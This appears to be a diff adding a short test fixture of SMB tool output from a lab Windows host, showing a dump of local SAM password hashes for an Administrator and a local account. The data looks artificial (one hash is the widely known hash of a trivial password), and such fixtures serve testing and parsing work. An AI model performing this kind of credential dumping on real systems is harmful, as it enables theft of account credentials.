@@ -1,0 +1,5 @@
+SMB         10.10.10.10     445    WS01     [*] Windows Server 2019 Build 17763 x64 (name:WS01) (domain:LAB)
+SMB         10.10.10.10     445    WS01     [*] Dumping SAM hashes
+SMB         10.10.10.10     445    WS01     Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+SMB         10.10.10.10     445    WS01     localuser:1001:aad3b435b51404eeaad3b435b51404ee:6f4b6612125fb3a0daecd2799dfd6f5f:::
+SMB         10.10.10.10     445    WS01     [+] Dumped 2 SAM hashes
